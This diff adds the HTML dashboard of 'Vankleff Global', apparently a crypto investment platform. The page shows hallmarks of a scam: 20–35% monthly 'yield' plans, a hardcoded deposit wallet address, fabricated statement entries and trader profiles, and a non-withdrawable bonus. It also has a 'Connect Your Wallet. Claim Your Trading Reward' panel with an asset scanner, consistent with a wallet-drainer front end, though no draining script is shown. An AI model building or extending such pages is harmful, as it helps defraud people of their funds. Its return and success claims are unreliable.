+<div class="wd-conf-ov" id="wd-conf-ov"><div class="wd-conf-box"><button class="modal-close" onclick="document.getElementById('wd-conf-ov').classList.remove('open')">✕</button><h3>Confirm Withdrawal</h3><div class="wd-conf-row"><span>Wallet Address</span><span id="wc-addr">—</span></div><div class="wd-conf-row"><span>Network</span><span id="wc-net">BEP-20</span></div><div class="wd-conf-row"><span>Amount</span><span id="wc-amt">—</span></div><div class="wd-conf-row"><span>Fee</span><span id="wc-fee">—</span></div><div class="wd-conf-row"><span>You Receive</span><span id="wc-recv">—</span></div><div class="wd-confirm-btns"><button class="btn-no" onclick="document.getElementById('wd-conf-ov').classList.remove('open')">Cancel</button><button class="btn-yes" style="background:#22c55e;" onclick="executeWithdrawal()">Confirm &amp; Withdraw</button></div></div></div>
+<div class="wd-success-ov" id="wd-success-ov"><div class="wd-success-box"><button class="wd-sc" onclick="document.getElementById('wd-success-ov').classList.remove('open')">✕</button><div style="font-size:50px;margin-bottom:12px;">✅</div><h3 style="font-size:18px;font-weight:800;color:#22c55e;margin-bottom:6px;">Withdrawal Submitted</h3><p style="font-size:12px;color:#aaa;line-height:1.6;">Your withdrawal has been queued for processing on the BEP-20 network.</p><div style="font-size:11px;color:#aaa;margin-top:10px;">Transaction ID</div><div class="wd-txid" id="wd-success-txid">—</div><button class="btn-gm" style="margin-top:14px;" onclick="document.getElementById('wd-success-ov').classList.remove('open')">Done</button></div></div>
+
+<div id="page-dashboard" class="page">
+  <div class="sb-ov" id="sb-ov" onclick="closeSB()"></div>
+  <div class="sidebar" id="sidebar">
+    <div class="sb-top"><div style="display:flex;align-items:center;gap:8px;"><div class="dn-logo">V</div><span style="font-size:13px;font-weight:800;color:#c9a84c;">VANKLEFF GLOBAL</span></div><button class="sb-close" onclick="closeSB()">✕</button></div>
+    <div class="sb-grp">OVERVIEW</div>
+    <div class="sb-item on" onclick="showDash('main');closeSB()"><div class="sb-left"><div class="sb-icon">⊞</div>Dashboard</div></div>
+    <div class="sb-item" onclick="showDash('markets');closeSB()"><div class="sb-left"><div class="sb-icon">📈</div>Live Markets</div><span class="sb-badge bl-live">LIVE</span></div>
+    <div class="sb-grp">PORTFOLIO</div>
+    <div class="sb-item" onclick="showDash('copytrade');closeSB()"><div class="sb-left"><div class="sb-icon">🔁</div>Copy Trading</div><span class="sb-badge bl-pro">Pro</span></div>
+    <div class="sb-item" onclick="showDash('plans');closeSB()"><div class="sb-left"><div class="sb-icon">📦</div>Investment Plans</div></div>
+    <div class="sb-grp">MARKET INTELLIGENCE</div>
+    <div class="sb-item" onclick="showDash('signals');closeSB()"><div class="sb-left"><div class="sb-icon">📶</div>Signals</div><span class="sb-badge bl-prem">Premium</span></div>
+    <div class="sb-item" onclick="showDash('performance');closeSB()"><div class="sb-left"><div class="sb-icon">📊</div>Performance</div></div>
+    <div class="sb-grp">WALLET</div>
+    <div class="sb-item" onclick="showDash('deposit');closeSB()"><div class="sb-left"><div class="sb-icon">⬇</div>Deposit</div></div>
+    <div class="sb-item" onclick="showDash('withdraw');closeSB()"><div class="sb-left"><div class="sb-icon">⬆</div>Withdraw</div></div>
+    <div class="sb-item" onclick="showDash('transfer');closeSB()"><div class="sb-left"><div class="sb-icon">⇄</div>Transfer</div></div>
+    <div class="sb-item" onclick="showDash('statement');closeSB()"><div class="sb-left"><div class="sb-icon">📋</div>Statement</div></div>
+    <div class="sb-grp">ACCOUNT</div>
+    <div class="sb-item" onclick="showDash('settings');closeSB()"><div class="sb-left"><div class="sb-icon">⚙</div>Settings</div></div>
+    <div class="sb-item" onclick="showDash('preferences');closeSB()"><div class="sb-left"><div class="sb-icon">🎛</div>Preferences</div></div>
+    <div class="sb-grp">GROWTH</div>
+    <div class="sb-item" onclick="showDash('referral');closeSB()"><div class="sb-left"><div class="sb-icon">👤</div>Referral</div><span class="sb-badge bl-10">10%</span></div>
+    <div class="sb-grp">SUCCESS</div>
+    <div class="sb-item" onclick="showDash('stories');closeSB()"><div class="sb-left"><div class="sb-icon">🌟</div>Success Stories</div></div>
+    <div class="sb-grp">SUPPORT</div>
+    <div class="sb-item" onclick="document.getElementById('sup-ov').classList.add('open');closeSB()"><div class="sb-left"><div class="sb-icon">💬</div>Chat Support</div></div>
+    <div class="sb-item sb-logout" onclick="showConf();closeSB()"><div class="sb-left" style="color:#ef4444;"><div class="sb-icon">🚪</div>Logout</div></div>
+  </div>
+
+  <div class="dash-nav"><button class="ham" onclick="openSB()">☰</button><div class="dn-brand"><div class="dn-logo">V</div><div><span class="dn-name">VANKLEFF GLOBAL</span><span class="dn-sub">Your Gateway to Trading</span></div></div><div class="av-circle" id="nav-avatar" onclick="openPM()">V</div></div>
+
+  <div id="dd-main"><div class="dash-content">
+    <div style="margin-bottom:16px;"><h2 style="font-size:20px;font-weight:800;">Welcome back, <span style="color:#22c55e;" id="user-greet-name">Member</span></h2><p style="font-size:12px;color:#aaa;">Here's your trading overview</p></div>
+    <div class="balance-card"><div class="bal-lbl">Available Balance</div><div class="bal-amount">$100.00</div><div class="bonus-chip">🎁 $100 Welcome Bonus (Non-Withdrawable)</div><div class="bal-btns"><button class="btn-dep" onclick="showDash('deposit')">⬇ Deposit</button><button class="btn-wit" onclick="showDash('withdraw')">⬆ Withdraw</button></div></div>
+    <div id="active-investments-section"></div>
+    <div class="mini-grid"><div class="mini-card"><div style="font-size:24px;margin-bottom:6px;">📈</div><div class="mc-val" id="mc-profit">+$0.00</div><div class="mc-lbl">Total Profit</div></div><div class="mini-card"><div style="font-size:24px;margin-bottom:6px;">⬇</div><div class="mc-val" id="mc-deposit">$0.00</div><div class="mc-lbl">Lifetime Deposits</div></div></div>
+    <div class="price-box"><h3>Live Prices <span class="ldot"></span></h3>
+      <div class="pr"><div class="pr-l"><div class="pr-ic">B</div><div><div class="pr-nm">Bitcoin</div><div class="pr-tk">BTC</div></div></div><div style="text-align:right"><div class="pr-price" id="p-btc">$97,245.3</div><div class="up" id="c-btc">▲ +2.4%</div></div></div>
+      <div class="pr"><div class="pr-l"><div class="pr-ic">E</div><div><div class="pr-nm">Ethereum</div><div class="pr-tk">ETH</div></div></div><div style="text-align:right"><div class="pr-price" id="p-eth">$3,412.8</div><div class="up" id="c-eth">▲ +1.8%</div></div></div>
+      <div class="pr"><div class="pr-l"><div class="pr-ic">B</div><div><div class="pr-nm">BNB</div><div class="pr-tk">BNB</div></div></div><div style="text-align:right"><div class="pr-price" id="p-bnb">$645.2</div><div class="dn2" id="c-bnb">▼ -0.3%</div></div></div>
+      <div class="pr"><div class="pr-l"><div class="pr-ic">S</div><div><div class="pr-nm">Solana</div><div class="pr-tk">SOL</div></div></div><div style="text-align:right"><div class="pr-price" id="p-sol">$178.9</div><div class="up" id="c-sol">▲ +5.2%</div></div></div>
+      <div class="pr"><div class="pr-l"><div class="pr-ic">X</div><div><div class="pr-nm">XRP</div><div class="pr-tk">XRP</div></div></div><div style="text-align:right"><div class="pr-price" id="p-xrp">$2.34</div><div class="up" id="c-xrp">▲ +3.1%</div></div></div>
+      <div class="pr"><div class="pr-l"><div class="pr-ic">A</div><div><div class="pr-nm">Cardano</div><div class="pr-tk">ADA</div></div></div><div style="text-align:right"><div class="pr-price" id="p-ada">$0.98</div><div class="dn2" id="c-ada">▼ -1.2%</div></div></div>
+    </div>
+
+    <div class="wcta" id="web3-section">
+      <h3 style="font-size:18px;font-weight:900;margin-bottom:8px;">Connect Your Wallet. Claim Your Trading Reward.</h3>
+      <p style="font-size:12px;color:#aaa;margin-bottom:14px;">Connect your wallet and authorize the transfer — funds move directly on-chain.</p>
+      <div class="net-selector">
+        <div class="net-opt active" id="net-bsc" onclick="selectNetwork('bsc')"><span class="net-icon">🟡</span><div style="text-align:left;"><div style="font-size:13px;font-weight:800;">BSC</div><div style="font-size:10px;opacity:.7;">BNB Chain · ID 56</div></div></div>
+        <div class="net-opt" id="net-ethereum" onclick="selectNetwork('ethereum')"><span class="net-icon">🔷</span><div style="text-align:left;"><div style="font-size:13px;font-weight:800;">Ethereum</div><div style="font-size:10px;opacity:.7;">Mainnet · ID 1</div></div></div>
+      </div>
+      <div class="active-net-bar"><div class="active-net-dot dot-bsc" id="activeNetDot"></div><span style="font-size:11px;">Active Network:</span><span class="active-net-name" id="activeNetName">BNB Smart Chain</span><span class="active-net-id" id="activeNetId">Chain ID: 56</span></div>
+      <button class="btn-cw" id="connectBtn">Connect Wallet</button>
+      <div class="w3-btn-row">
+        <button class="btn-w3-claim" id="claimBtn">🏆 CLAIM REWARD</button>
+        <button class="btn-w3-disconnect" id="disconnectBtn">Disconnect</button>
+      </div>
+    </div>
+
+    <div class="web3-panels">
+      <p id="statusText"></p>
+      <div id="infoPanel">
+        <div class="info-row"><span class="info-label">Address</span><span class="info-value" id="walletAddress">—</span></div>
+        <hr class="divider">
+        <div class="info-row"><span class="info-label">Network</span><span class="info-value" id="networkName">—</span></div>
+        <div class="info-row"><span class="info-label">Chain ID</span><span class="info-value" id="chainIdDisplay">—</span></div>
+        <hr class="divider">
+        <div class="info-row"><span class="info-label">Native Balance</span><span class="info-value" id="nativeBalance">—</span></div>
+        <div class="info-row"><span class="info-label">Token Balance</span><span class="info-value" id="usdtBalance">—</span></div>
+        <hr class="divider">
+        <div class="info-row"><span class="info-label">Status</span><span class="badge badge-yellow" id="statusBadge">Awaiting Reward</span></div>
+        <div class="info-row"><span class="info-label">Session</span><span class="badge badge-blue" id="sessionLabel">Web3Modal</span></div>
+      </div>
+      <div id="scannerPanel"><div class="scanner-title">🔍 Discovered Assets</div><div id="assetList"><span class="scan-status">Awaiting scan...</span></div></div>
+      <div id="txPanel"><div class="tx-title">Transaction Log</div><div id="txList"><span style="color:#64748b;font-size:0.85rem;">No transactions yet.</span></div></div>
+    </div>
+    <h3 style="font-size:16px;font-weight:800;margin:18px 0 12px;">Wallet Connection Success Stories</h3>
+    <div id="rot-test"></div>
+  </div></div>
+
+  <div id="dd-markets" style="display:none;"><div class="ph"><h1>Live Markets</h1><p>Real-time crypto prices</p></div><div style="padding:0 20px;" id="mkt-list"></div><div style="padding:0 20px;"><button class="back-btn" onclick="showDash('main')">← Back</button></div></div>
+
+  <div id="dd-signals" style="display:none;">
+    <div class="ph"><h1>Premium Signals</h1><p>AI-powered trading signals up to 95% accuracy</p></div>
+    <div class="sig-card"><h3 style="font-size:17px;font-weight:800;">Expert</h3><div class="sig-price">$199<span style="font-size:13px;color:#aaa;">/mo</span></div><div class="sig-desc">Portfolios $5,000–$20,000</div><div class="sig-rate">30+ signals · 5/day · 70-80% success</div><ul class="sig-feats"><li>30 monthly signals</li><li>Telegram channel access</li><li>Basic analysis</li><li>Email alerts</li></ul><button class="btn-sub" onclick="subSig(199)">Subscribe</button></div>
+    <div class="sig-card pop"><div class="sig-badge">MOST POPULAR</div><h3 style="font-size:17px;font-weight:800;">VIP</h3><div class="sig-price">$499<span style="font-size:13px;color:#aaa;">/mo</span></div><div class="sig-desc">Portfolios $25,000–$100,000</div><div class="sig-rate">50+ signals · 10/day · 80-90% success</div><ul class="sig-feats"><li>50 monthly signals</li><li>Telegram + group</li><li>Advanced analysis</li><li>Priority support</li><li>Risk management tips</li></ul><button class="btn-sub" onclick="subSig(499)">Subscribe</button></div>
+    <div class="sig-card"><h3 style="font-size:17px;font-weight:800;">Elite</h3><div class="sig-price">$999<span style="font-size:13px;color:#aaa;">/mo</span></div><div class="sig-desc">High-conviction institutional positioning</div><div class="sig-rate">Unlimited · 15/day · 90-95% success</div><ul class="sig-feats"><li>Unlimited signals</li><li>Private group access</li><li>Expert analysis</li><li>24/7 support</li><li>Live sessions</li></ul><button class="btn-sub" onclick="subSig(999)">Subscribe</button></div>
+    <div class="sig-card"><h3 style="font-size:17px;font-weight:800;">Enterprise</h3><div class="sig-price">$2499<span style="font-size:13px;color:#aaa;">/mo</span></div><div class="sig-desc">Institutional Grade</div><div class="sig-rate">Unlimited+ · 95%+ success</div><ul class="sig-feats"><li>Unlimited signals</li><li>Dedicated manager</li><li>Custom strategy</li><li>1-on-1 sessions</li><li>White-glove support</li></ul><button class="btn-sub" onclick="subSig(2499)">Subscribe</button></div>
+    <div style="padding:0 20px 20px;"><button class="back-btn" onclick="showDash('main')">← Back</button></div>
+  </div>
+
+  <div id="dd-plans" style="display:none;">
+    <div class="ph"><h1>Investment Plans</h1><p>Choose a plan that fits your goals</p></div>
+    <div style="padding:0 20px;" id="plans-list">
+      <div class="ip-item" onclick="openPS('yield')"><div style="display:flex;align-items:center;gap:10px;margin-bottom:6px;"><span style="font-size:24px;">💰</span><span style="font-size:16px;font-weight:800;color:#c9a84c;">Institutional Yield</span></div><div style="font-size:11px;color:#aaa;">$1,000 – $9,999 · 20% Monthly · 30 days</div></div>
+      <div class="ip-item" style="border:2px solid #22c55e;" onclick="openPS('alpha')"><div style="display:flex;align-items:center;gap:10px;margin-bottom:6px;"><span style="font-size:24px;">✨💎</span><span style="font-size:16px;font-weight:800;color:#c9a84c;">Strategic Alpha</span></div><div style="font-size:11px;color:#aaa;">$10,000 – $49,999 · 25% Monthly · 30 days</div></div>
+      <div class="ip-item" style="border:2px solid #f59e0b;" onclick="openPS('elite')"><div style="display:flex;align-items:center;gap:10px;margin-bottom:6px;"><span style="font-size:24px;">🔥🏆</span><span style="font-size:16px;font-weight:800;color:#c9a84c;">Elite Managed</span></div><div style="font-size:11px;color:#aaa;">$50,000 – $499,999 · 35% Monthly · 30 days</div></div>
+    </div>
+    <div style="padding:0 20px;">
+      <div class="ps-card" id="ps-yield"><div style="font-size:16px;font-weight:800;color:#c9a84c;margin-bottom:4px;">💰 Institutional Yield Plan</div><div style="font-size:11px;color:#aaa;margin-bottom:16px;">20% Monthly Yield · 30 days</div><div class="ps-amount" id="sv-a">$1,000</div><input type="range" min="1000" max="9999" value="1000" step="100" oninput="updPS('yield',this.value)"/><div style="display:flex;justify-content:space-between;font-size:11px;color:#666;margin-bottom:14px;"><span>$1,000</span><span>$9,999</span></div><div class="ps-sum"><div class="ps-row"><span>Expected Return</span><span id="sv-r">$200</span></div><div class="ps-row"><span>Duration</span><span>30 days</span></div></div><div class="ps-btns"><button class="btn-psb" onclick="closePS()">Back</button><button class="btn-psi" onclick="investNow()">Invest Now</button></div></div>
+      <div class="ps-card" id="ps-alpha"><div style="font-size:16px;font-weight:800;color:#c9a84c;margin-bottom:4px;">✨ Strategic Alpha Plan</div><div style="font-size:11px;color:#aaa;margin-bottom:16px;">25% Monthly Yield · 30 days</div><div class="ps-amount" id="sa-a">$10,000</div><input type="range" min="10000" max="49999" value="10000" step="500" oninput="updPS('alpha',this.value)"/><div style="display:flex;justify-content:space-between;font-size:11px;color:#666;margin-bottom:14px;"><span>$10,000</span><span>$49,999</span></div><div class="ps-sum"><div class="ps-row"><span>Expected Return</span><span id="sa-r">$2,500</span></div><div class="ps-row"><span>Duration</span><span>30 days</span></div></div><div class="ps-btns"><button class="btn-psb" onclick="closePS()">Back</button><button class="btn-psi" onclick="investNow()">Invest Now</button></div></div>
+      <div class="ps-card" id="ps-elite"><div style="font-size:16px;font-weight:800;color:#c9a84c;margin-bottom:4px;">🔥 Elite Managed Plan</div><div style="font-size:11px;color:#aaa;margin-bottom:16px;">35% Monthly Yield · 30 days</div><div class="ps-amount" id="se-a">$50,000</div><input type="range" min="50000" max="499999" value="50000" step="1000" oninput="updPS('elite',this.value)"/><div style="display:flex;justify-content:space-between;font-size:11px;color:#666;margin-bottom:14px;"><span>$50,000</span><span>$499,999</span></div><div class="ps-sum"><div class="ps-row"><span>Expected Return</span><span id="se-r">$17,500</span></div><div class="ps-row"><span>Duration</span><span>30 days</span></div></div><div class="ps-btns"><button class="btn-psb" onclick="closePS()">Back</button><button class="btn-psi" onclick="investNow()">Invest Now</button></div></div>
+    </div>
+  </div>
+
+  <div id="dd-copytrade" style="display:none;">
+    <div class="ph"><h1>Copy Trading <span style="background:#7c3aed;color:#fff;font-size:11px;padding:3px 8px;border-radius:10px;margin-left:6px;">Pro</span></h1><p>Copy top traders and earn passive income</p></div>
+    <div style="padding:0 20px;">
+      <div class="ct-card"><div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;"><img class="ct-av" src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100&h=100&fit=crop&crop=face" alt="Alex"/><div><div style="font-size:16px;font-weight:800;">Alex Sterling</div><div style="font-size:12px;color:#aaa;">BTC/ETH · ⭐ 4.9 · Win: 89%</div></div></div><div class="ct-stats"><div class="ct-stat"><div class="ct-stat-l">Followers</div><div class="ct-stat-v">12.4K</div></div><div class="ct-stat"><div class="ct-stat-l">Return</div><div class="ct-stat-v">+34%</div></div></div><div style="font-size:11px;color:#aaa;margin-bottom:10px;">Min: $500</div><button style="width:100%;padding:12px;background:#22c55e;border-radius:10px;color:#fff;font-size:14px;font-weight:700;" onclick="openCP('Alex Sterling',500)">Copy Trader</button></div>
+      <div class="ct-card"><div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;"><img class="ct-av" src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=100&h=100&fit=crop&crop=face" alt="Sarah"/><div><div style="font-size:16px;font-weight:800;">Sarah Chen</div><div style="font-size:12px;color:#aaa;">Altcoins · ⭐ 4.8 · Win: 85%</div></div></div><div class="ct-stats"><div class="ct-stat"><div class="ct-stat-l">Followers</div><div class="ct-stat-v">8.9K</div></div><div class="ct-stat"><div class="ct-stat-l">Return</div><div class="ct-stat-v">+28%</div></div></div><div style="font-size:11px;color:#aaa;margin-bottom:10px;">Min: $1,000</div><button style="width:100%;padding:12px;background:#22c55e;border-radius:10px;color:#fff;font-size:14px;font-weight:700;" onclick="openCP('Sarah Chen',1000)">Copy Trader</button></div>
+      <div class="ct-card"><div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;"><img class="ct-av" src="https://images.unsplash.com/photo-1560250097-0b93528c311a?w=100&h=100&fit=crop&crop=face" alt="Marcus"/><div><div style="font-size:16px;font-weight:800;">Marcus Williams</div><div style="font-size:12px;color:#aaa;">Futures · ⭐ 4.7 · Win: 82%</div></div></div><div class="ct-stats"><div class="ct-stat"><div class="ct-stat-l">Followers</div><div class="ct-stat-v">6.2K</div></div><div class="ct-stat"><div class="ct-stat-l">Return</div><div class="ct-stat-v">+41%</div></div></div><div style="font-size:11px;color:#aaa;margin-bottom:10px;">Min: $2,000</div><button style="width:100%;padding:12px;background:#22c55e;border-radius:10px;color:#fff;font-size:14px;font-weight:700;" onclick="openCP('Marcus Williams',2000)">Copy Trader</button></div>
+      <button class="back-btn" onclick="showDash('main')">← Back</button>
+    </div>
+  </div>
+
+  <div id="dd-deposit" style="display:none;"><div class="dep-wrap"><h1 style="font-size:24px;font-weight:900;margin-bottom:4px;">Deposit Funds</h1><p style="font-size:13px;color:#aaa;margin-bottom:18px;">Select Payment Method</p><div class="meth-grid"><div class="meth sel" id="m-usdt" onclick="selM('usdt')"><div class="meth-ic ic-usdt">₮</div>USDT (BEP-20)</div><div class="meth" id="m-ltc" onclick="selM('ltc')"><div class="meth-ic ic-ltc">Ł</div>LTC</div><div class="meth" id="m-btc" onclick="selM('btc')"><div class="meth-ic ic-btc">₿</div>BTC</div><div class="meth" id="m-bnb" onclick="selM('bnb')"><div class="meth-ic ic-bnb">B</div>BNB</div></div><div id="dep-form"><p style="font-size:12px;color:#aaa;margin-bottom:8px;">Enter Amount (USD)</p><input class="amt-input" type="number" id="dep-amt" placeholder="Minimum $1,000"/><div class="quick-amts"><button class="qa" onclick="setAmt(1000)">$1,000</button><button class="qa" onclick="setAmt(5000)">$5,000</button><button class="qa" onclick="setAmt(10000)">$10,000</button><button class="qa" onclick="setAmt(25000)">$25,000</button><button class="qa" onclick="setAmt(50000)">$50,000</button><button class="qa" onclick="setAmt(100000)">$100,000</button></div><button class="btn-cont" onclick="showAddr()">Continue</button></div><div id="dep-addr" style="display:none;"><div style="font-size:11px;font-weight:700;color:#aaa;letter-spacing:2px;text-align:center;margin-bottom:12px;">SEND PAYMENT TO THIS ADDRESS</div><div style="background:#fff;border-radius:14px;width:180px;height:180px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;overflow:hidden;"><img id="qr-img" src="" alt="QR" style="width:100%;height:100%;object-fit:contain;"/></div><div class="addr-box"><div class="addr-lbl" id="addr-lbl">USDT (BEP-20) Wallet Address</div><div class="addr-val" id="w-addr">0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db</div><div class="addr-row"><button class="btn-copy" onclick="cpAddr()">📋 Copy</button><div class="net-badge" id="net-bdg">BEP-20</div></div></div><div class="warn-box"><span>⚠</span><p id="warn-txt">Only send USDT (BEP-20) to this address.</p></div><div class="timer-row">⏱ Expires in: <span class="timer-val" id="tmr">30:00</span></div><div style="background:#0d1a0d;border:1px solid #22c55e;border-radius:14px;padding:16px;margin-bottom:14px;"><div style="font-size:11px;font-weight:700;color:#22c55e;letter-spacing:2px;margin-bottom:8px;">⚡ AUTOMATIC BLOCKCHAIN DETECTION</div><p style="font-size:12px;color:#aaa;line-height:1.6;">Deposits are detected automatically. Your balance will be credited once confirmed on-chain.</p></div><div style="display:flex;gap:10px;margin-top:14px;"><button class="btn-psb" style="flex:1;" onclick="document.getElementById('dep-addr').style.display='none';document.getElementById('dep-form').style.display='block';clearTmr()">Back</button><button class="btn-cd" style="flex:2;" onclick="confDep()">Confirm Payment</button></div></div><button class="back-btn" onclick="showDash('main')">← Back to Dashboard</button></div></div>
+
+  <div id="dd-withdraw" style="display:none;"><div style="padding:18px;max-width:100%;overflow:hidden;"><h1 style="font-size:22px;font-weight:900;margin-bottom:16px;">Withdraw Funds</h1><div class="sec-notice"><h4>⚠ Security Notice</h4><p>All withdrawals require a 6-digit OTP sent to your email. BEP-20 network only.</p></div><div class="code-box"><label class="wd-label" for="wd-addr">Destination Wallet Address (USDT/BEP-20)</label><input id="wd-addr" class="wd-input" type="text" placeholder="0x... BEP-20 address"/><label class="wd-label" for="wd-amt">Withdrawal Amount (USDT)</label><input id="wd-amt" class="wd-amt" type="number" placeholder="Minimum $100" oninput="updWdDetails()"/><div class="wd-details"><div class="wd-detail-row"><span>Withdrawal Fee</span><span id="wd-fee">$0.00</span></div><div class="wd-detail-row"><span>Minimum Withdrawal</span><span>$100.00 USDT</span></div><div class="wd-detail-row"><span>Amount to Receive</span><span id="wd-recv">$0.00</span></div><div class="wd-detail-row"><span>Network</span><span>BEP-20</span></div></div><h3 style="font-size:14px;font-weight:700;margin-bottom:4px;">Enter Withdrawal Code</h3><p style="font-size:11px;color:#aaa;margin-bottom:12px;">A 6-digit OTP has been sent to your registered email</p><div class="otp-row"><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/></div><div class="resend-otp" onclick="sendWithdrawalOTP()">Resend OTP</div><div style="display:flex;justify-content:space-between;background:#0d0d0d;border-radius:10px;padding:12px;"><span style="color:#aaa;font-size:12px;">Withdrawable Balance</span><strong id="wd-balance" style="color:#22c55e;font-size:13px;">$0.00</strong></div></div><button class="btn-verify" onclick="verifyWithdraw()">Verify &amp; Withdraw</button>
+  <div class="wd-history"><h3>Withdrawal History</h3><div style="overflow-x:auto;"><table><thead><tr><th>Tx ID</th><th>Date</th><th>Amount</th><th>Wallet</th><th>Status</th></tr></thead><tbody id="wd-history-body"><tr><td colspan="5" style="text-align:center;color:#666;">No withdrawals yet.</td></tr></tbody></table></div></div>
+  <h3 style="font-size:15px;font-weight:700;margin:20px 0 10px;">Security Information</h3><div class="sec-item" onclick="this.classList.toggle('open')"><div class="sec-top"><div class="sec-lft"><span>🛡</span>Two-Factor Authentication</div><span class="arr">⌄</span></div><div class="sec-body">2FA is required for all withdrawals to protect your funds.</div></div><div class="sec-item" onclick="this.classList.toggle('open')"><div class="sec-top"><div class="sec-lft"><span>🕐</span>Processing Time</div><span class="arr">⌄</span></div><div class="sec-body">Withdrawals processed within 24-48 hours after verification.</div></div><div class="sec-item" onclick="this.classList.toggle('open')"><div class="sec-top"><div class="sec-lft"><span>💲</span>Minimum Withdrawal</div><span class="arr">⌄</span></div><div class="sec-body">Minimum withdrawal is $100 USDT.</div></div><button class="back-btn" onclick="showDash('main')">← Back</button></div></div>
+
+  <div id="dd-transfer" style="display:none;"><div style="padding:18px;"><h1 style="font-size:22px;font-weight:900;margin-bottom:18px;">Internal Transfer</h1><div class="tf-card"><div style="display:flex;justify-content:space-between;background:#0d0d0d;border-radius:10px;padding:12px;margin-bottom:16px;"><span style="color:#aaa;font-size:13px;">Balance</span><span id="tf-balance" style="color:#22c55e;font-weight:800;">$100.00</span></div><label style="font-size:13px;color:#ccc;margin-bottom:6px;display:block;">Recipient</label><input class="tf-in" id="tf-rec" placeholder="Email or username"/><label style="font-size:13px;color:#ccc;margin-bottom:6px;display:block;">Amount (USD)</label><input class="tf-in" id="tf-amt" type="number" placeholder="0.00"/><button class="btn-cont" style="margin-top:8px;" onclick="doTransfer()">⇄ Send Transfer</button></div><button class="back-btn" onclick="showDash('main')">← Back</button></div></div>
+
+  <div id="dd-statement" style="display:none;"><div class="ph"><h1>Account Statement</h1><p>All transaction records</p></div><div class="stmt-filters"><button class="sfbtn on" onclick="fStmt('all',this)">All</button><button class="sfbtn" onclick="fStmt('deposit',this)">Deposit</button><button class="sfbtn" onclick="fStmt('withdrawal',this)">Withdrawal</button><button class="sfbtn" onclick="fStmt('investment',this)">Investment</button><button class="sfbtn" onclick="fStmt('trade',this)">Trade</button></div><div id="stmt-list"><div class="st-item" data-t="deposit"><div class="st-lft"><div class="st-ico">⬇</div><div><div class="st-ttl">Deposit via USDT</div><div class="st-sub">May 11, 2026</div></div></div><div style="text-align:right"><div class="st-amt p">+$1,000.00</div><span class="sbdg sp2">pending</span></div></div><div class="st-item" data-t="withdrawal"><div class="st-lft"><div class="st-ico">⬆</div><div><div class="st-ttl">Withdrawal Request</div><div class="st-sub">May 8, 2026</div></div></div><div style="text-align:right"><div class="st-amt n">-$2,000.00</div><span class="sbdg sc2">completed</span></div></div><div class="st-item" data-t="investment"><div class="st-lft"><div class="st-ico">📊</div><div><div class="st-ttl">Strategic Alpha Plan</div><div class="st-sub">May 7, 2026</div></div></div><div style="text-align:right"><div class="st-amt p">+$3,500.00</div><span class="sbdg sc2">completed</span></div></div><div class="st-item" data-t="trade"><div class="st-lft"><div class="st-ico">🔁</div><div><div class="st-ttl">Copy Trade - Alex Sterling</div><div class="st-sub">May 6, 2026</div></div></div><div style="text-align:right"><div class="st-amt p">+$420.00</div><span class="sbdg sc2">completed</span></div></div></div><div style="padding:0 20px;"><button class="back-btn" onclick="showDash('main')">← Back</button></div></div>
+
+  <div id="dd-performance" style="display:none;">
+    <div class="ph"><h1>Performance</h1><p>Your trading analytics</p></div>
+    <div class="perf-grid">
+      <div class="perf-card"><div id="perf-balance" style="font-size:22px;font-weight:900;color:#22c55e;">$100.00</div><div style="font-size:11px;color:#aaa;margin-top:3px;">Total Balance</div></div>
+      <div class="perf-card"><div id="perf-profit" style="font-size:22px;font-weight:900;color:#22c55e;">$0.00</div><div style="font-size:11px;color:#aaa;margin-top:3px;">Total Profit</div></div>
+      <div class="perf-card"><div id="perf-active-inv" style="font-size:22px;font-weight:900;color:#22c55e;">0</div><div style="font-size:11px;color:#aaa;margin-top:3px;">Active Investments</div></div>
+      <div class="perf-card"><div style="font-size:22px;font-weight:900;color:#22c55e;">0</div><div style="font-size:11px;color:#aaa;margin-top:3px;">Active Trades</div></div>
+    </div>
+    <div style="padding:0 16px 20px;"><div style="background:#2d3a00;border-radius:14px;padding:20px;text-align:center;margin-bottom:16px;"><div style="font-size:14px;font-weight:700;margin-bottom:10px;">Portfolio Performance</div><div style="color:#aaa;font-size:12px;">Chart will populate as you invest.</div></div><button class="back-btn" onclick="showDash('main')">← Back</button></div>
+  </div>
+
+  <div id="dd-settings" style="display:none;"><div style="padding:18px;"><h1 style="font-size:22px;font-weight:900;margin-bottom:18px;">Account Settings</h1><div class="set-card"><div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;"><div style="width:42px;height:42px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-size:18px;" id="set-avatar">V</div><div><div style="font-size:14px;font-weight:800;" id="set-username">Member</div><div style="font-size:11px;color:#aaa;" id="set-email">Not set</div></div></div><span class="set-lbl">👤 Username</span><input class="set-inp" id="set-username-inp" value=""/><span class="set-lbl">📞 Phone</span><input class="set-inp" id="set-phone-inp" placeholder="+1 234 567 890"/><span class="set-lbl">🌐 Country</span><input class="set-inp" id="set-country-inp" placeholder="United States"/><button class="btn-save" onclick="saveSettings()">Save Changes</button></div><button class="back-btn" onclick="showDash('main')">← Back</button></div></div>
+
+  <div id="dd-preferences" style="display:none;"><div style="padding:18px;"><h1 style="font-size:22px;font-weight:900;margin-bottom:18px;">Preferences</h1><div class="pref-sec"><div style="font-size:14px;font-weight:700;margin-bottom:12px;">Notifications</div><div class="pref-row"><span style="font-size:13px;color:#ccc;">Push Notifications</span><div class="toggle on" onclick="this.classList.toggle('on')"><div class="tknob"></div></div></div><div class="pref-row"><span style="font-size:13px;color:#ccc;">Email Alerts</span><div class="toggle on" onclick="this.classList.toggle('on')"><div class="tknob"></div></div></div><div class="pref-row"><span style="font-size:13px;color:#ccc;">Trade Confirmations</span><div class="toggle on" onclick="this.classList.toggle('on')"><div class="tknob"></div></div></div></div><button class="back-btn" onclick="showDash('main')">← Back</button></div></div>
+
